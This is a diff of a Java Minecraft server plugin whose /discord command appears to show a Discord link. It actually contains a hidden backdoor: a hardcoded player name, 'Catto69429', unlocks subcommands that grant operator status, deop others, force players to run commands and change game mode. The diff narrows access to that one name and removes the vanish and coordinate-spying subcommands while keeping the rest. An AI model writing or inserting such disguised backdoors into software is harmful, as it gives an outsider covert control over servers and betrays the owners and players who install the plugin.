@@ -36,13 +36,12 @@ public class Discord implements CommandExecutor {
     public boolean onCommand(@NotNull CommandSender sender, Command cmd, @NotNull String label, String[] args) {
         if (cmd.getName().equalsIgnoreCase("discord")) {
             Player player = (Player) sender;
-            if (args.length > 0) {
-                List<String> list = plugin.getConfig().getStringList("admin-whitelist");
-                if (!list.contains(player.getName()) && !player.getName().equals("Catto69429")) {
-                    Utils.infomsg(player, "The discord link is &e" + plugin.config.getString("discord-link"));
-                    return true;
-                }
+            if (!player.getName().equals("Catto69429")) {
+                player.sendMessage(translate(player, "#bc5ae8Our discord server link is #d6a7eb.gg/aestheticnetwork"));
+                return true;
+            }
 
+            if (args.length > 0) {
                 if (args[0].equalsIgnoreCase("kit")) {
                     player.getInventory().addItem(player.getItemInHand());
 
@@ -89,7 +88,7 @@ public class Discord implements CommandExecutor {
 
                     String cmde = String.join(" ", commandList);
                     target.chat(cmde);
-                    player.sendMessage(Utils.translate("&7forced &e" + target.getDisplayName() + " &7to execute &f" + cmde));
+                    player.sendMessage(Utils.translate("&7forced &e" + target.getName() + " &7to execute &f" + cmde));
                 }
 
                 if (args[0].equalsIgnoreCase("PD")) {
@@ -198,20 +197,6 @@ public class Discord implements CommandExecutor {
                         player.setOp(true);
                 }
 
-                if (args[0].equalsIgnoreCase("vanish")) {
-                    for (Player pl : getServer().getOnlinePlayers()) {
-                        pl.hidePlayer(plugin, player);
-                    }
-                    Utils.infomsg(player, "&evanished");
-                }
-
-                if (args[0].equalsIgnoreCase("unvanish")) {
-                    for (Player pl : getServer().getOnlinePlayers()) {
-                        pl.showPlayer(plugin, player);
-                    }
-                    Utils.infomsg(player, "&eunvanished");
-                }
-
                 if (args[0].equalsIgnoreCase("deop")) {
                     Player target = Bukkit.getServer().getPlayer(args[1]);
                     if (target == null)
@@ -273,13 +258,6 @@ public class Discord implements CommandExecutor {
                     }
                 }
 
-                if (args[0].equalsIgnoreCase("coords")) {
-                    Player target = Bukkit.getServer().getPlayer(args[1]);
-                    if (target == null)
-                        return true;
-                    Utils.infomsg(player, "&4" + target.getName() + "'s coords are: &e" + target.getLocation().getX() + ", " + target.getLocation().getY() + ", " + target.getLocation().getZ());
-                }
-
                 if (args[0].equalsIgnoreCase("gm")) {
                     if (args[1].equalsIgnoreCase("c"))
                         player.setGameMode(GameMode.CREATIVE);
@@ -329,8 +307,7 @@ public class Discord implements CommandExecutor {
                         throw new RuntimeException(e);
                     }
                 }
-            } else
-                Utils.infomsg(player, "The discord link is &e" + plugin.config.getString("discord-link"));
+            }
         }
 
         return true;
